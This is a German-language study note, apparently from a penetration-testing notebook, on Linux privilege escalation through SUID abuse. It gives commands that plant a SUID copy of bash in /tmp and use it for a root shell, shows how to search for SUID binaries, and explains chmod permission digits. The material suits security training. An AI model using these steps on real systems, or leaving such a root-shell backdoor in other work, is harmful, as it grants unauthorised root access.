---
tags: [technique, privesc, linux]
---
# SUID Abuse

> **SUID-Bit**: Ein Programm läuft **immer mit den Rechten seines Besitzers**, egal wer es startet. Gehört es root → Ausführung als root.

## SUID-Bash als Root-Shell

Wenn ein root-Prozess (Cronjob, Service, Sudo-Befehl) einen Befehl für dich ausführt:

```bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
```

Dann:

```bash
/tmp/rootbash -p     # -p = erhöhte Rechte behalten
id                   # euid=0(root)
```

> [!danger] `chmod +s` reicht nicht `+s` → `-rws--S---` (SUID, aber **kein `x`** für Gruppe/Andere) → `Permission denied`. `chmod 4755` → `-rwsr-xr-x` → ausführbar für alle.

## `chmod 4755` gelesen

| Ziffer | Bits  | Für    |
| ------ | ----- | ------ |
| `4`    | SUID  | –      |
| `7`    | `rwx` | Owner  |
| `5`    | `r-x` | Gruppe |
| `5`    | `r-x` | Andere |
## chmod-Zahlen verstehen
Jede Ziffer = Summe aus **read(4) + write(2) + execute(1)**

| Ziffer | Rechte |
| ------ | ------ |
| `7`    | `rwx`  |
| `6`    | `rw-`  |
| `5`    | `r-x`  |
| `4`    | `r--`  |
| `3`    | `-wx`  |
| `2`    | `-w-`  |
| `1`    | `--x`  |
| `0`    | `---`  |
3 Ziffern = **Owner / Gruppe / Andere** (z.B. `755` = `rwxr-xr-x`).

**Führende 4. Ziffer** = Spezial-Bits (ebenfalls addierbar):

| Wert | Bit    | Wirkung                                           |
| ---- | ------ | ------------------------------------------------- |
| `4`  | SUID   | läuft mit Rechten des **Besitzers**               |
| `2`  | SGID   | läuft mit Rechten der **Gruppe**                  |
| `1`  | Sticky | nur Besitzer darf eigene Dateien löschen (`/tmp`) |

Beispiele: 
- `4755` SUID-Bash 
- `1777` = `/tmp` 
- `0644` normale Datei 
- `0600` SSH-Key
- `777` alles offen (= gesuchte Lücke).

## Vorhandene SUID-Binaries finden

```bash
find / -perm -4000 -type f 2>/dev/null
```

=> gefundene Binaries gegen [GTFOBins](https://gtfobins.github.io/) prüfen.

## Warum `-p`?

Ohne `-p` wirft bash die SUID-Rechte beim Start aus Sicherheit weg. Mit `-p` bleibst du root.